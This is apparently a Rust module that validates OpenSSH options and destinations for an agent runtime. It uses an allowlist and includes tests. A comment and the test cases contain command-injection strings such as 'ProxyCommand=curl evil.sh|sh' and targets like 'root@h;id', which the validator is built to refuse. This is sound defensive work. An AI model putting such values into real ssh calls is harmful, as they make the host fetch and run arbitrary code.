//! Which `-o Key=value` options an agent may hand to OpenSSH.
//!
//! One allowlist for the runtime's `SshExec` and the orchestrator's host
//! inventory (`x0ne_host_add`), so a record saved today and an option passed
//! tomorrow face the same rule.
//!
//! SECURITY: a denylist is not safe here. Several OpenSSH options make the
//! *local* host execute a command: `ProxyCommand`, `LocalCommand` (with
//! `PermitLocalCommand`), `ProxyJump`, `KnownHostsCommand`, `Match exec`, and
//! `Include` (which can pull in a config setting any of the former). Before
//! the allowlist, `ssh_options` was only checked for a leading `-` or a
//! newline, so `ProxyCommand=curl evil.sh|sh` validated cleanly and OpenSSH
//! ran it through /bin/sh on the machine hosting the runtime.

/// OpenSSH options an agent may set. Anything not named here is refused.
pub const ALLOWED_SSH_OPTION_KEYS: &[&str] = &[
    "batchmode",
    "connectattempts",
    "connecttimeout",
    "compression",
    "identitiesonly",
    "identityfile",
    "loglevel",
    "port",
    "preferredauthentications",
    "pubkeyauthentication",
    "passwordauthentication",
    "kbdinteractiveauthentication",
    "serveralivecountmax",
    "serveraliveinterval",
    "stricthostkeychecking",
    "user",
    "userknownhostsfile",
];

/// Validate one `Key=value` entry. `Err(reason)` if it must not reach `ssh`.
pub fn validate_ssh_option(opt: &str) -> Result<(), String> {
    if opt.contains(['\n', '\r', '\0']) {
        return Err(format!(
            "invalid ssh_options entry {opt:?}: contains a newline or NUL"
        ));
    }
    let trimmed = opt.trim();
    if trimmed.starts_with('-') {
        return Err(format!(
            "invalid ssh_options entry {opt:?}: must be a bare `Key=value`, not a flag"
        ));
    }
    let Some((raw_key, _value)) = trimmed.split_once('=') else {
        return Err(format!(
            "invalid ssh_options entry {opt:?}: expected `Key=value`"
        ));
    };
    // OpenSSH treats option keys case-insensitively, and tolerates whitespace
    // around the separator — normalize both before matching the allowlist.
    let key = raw_key.trim().to_ascii_lowercase();
    if key.is_empty() {
        return Err(format!("invalid ssh_options entry {opt:?}: empty key"));
    }
    if !ALLOWED_SSH_OPTION_KEYS.contains(&key.as_str()) {
        return Err(format!(
            "ssh option {raw_key:?} is not allowed. Permitted keys: {}. \
             Options that make the local host execute a command (ProxyCommand, \
             LocalCommand, PermitLocalCommand, ProxyJump, KnownHostsCommand, \
             Match, Include) are refused outright.",
            ALLOWED_SSH_OPTION_KEYS.join(", ")
        ));
    }
    Ok(())
}

/// An ssh destination as `ssh` takes it first on its command line:
/// `[user@]host`, `[user@]host:port` or `ssh://[user@]host[:port]`. A leading
/// `-` would be read as an option (`-oProxyCommand=…` runs a local command);
/// whitespace and control characters never belong in one. Audit of
/// 2026-10-30, H3-2.
pub fn validate_ssh_target(target: &str) -> Result<(), String> {
    let t = target.trim();
    if t.is_empty() {
        return Err("ssh target is empty".into());
    }
    if t.starts_with('-') {
        return Err(format!(
            "ssh target {target:?} starts with `-`: ssh would read it as an option"
        ));
    }
    if let Some(c) = t
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || "._:@/[]%-".contains(*c)))
    {
        return Err(format!(
            "ssh target {target:?} contains {c:?}: a destination is \
             `[user@]host[:port]` or `ssh://[user@]host[:port]`"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_target_that_ssh_would_read_as_an_option_is_refused() {
        for bad in [
            "",
            "-oProxyCommand=curl evil|sh",
            "root@h -oProxyCommand=x",
            "root@h\nProxyCommand=x",
            "root@h;id",
            "root@h`id`",
        ] {
            assert!(validate_ssh_target(bad).is_err(), "{bad:?}");
        }
        for ok in [
            "root@192.0.2.7",
            "h.example.com",
            "ssh://user@h.example.com:2222",
            "[fe80::1%eth0]:22",
        ] {
            assert!(validate_ssh_target(ok).is_ok(), "{ok:?}");
        }
    }
}
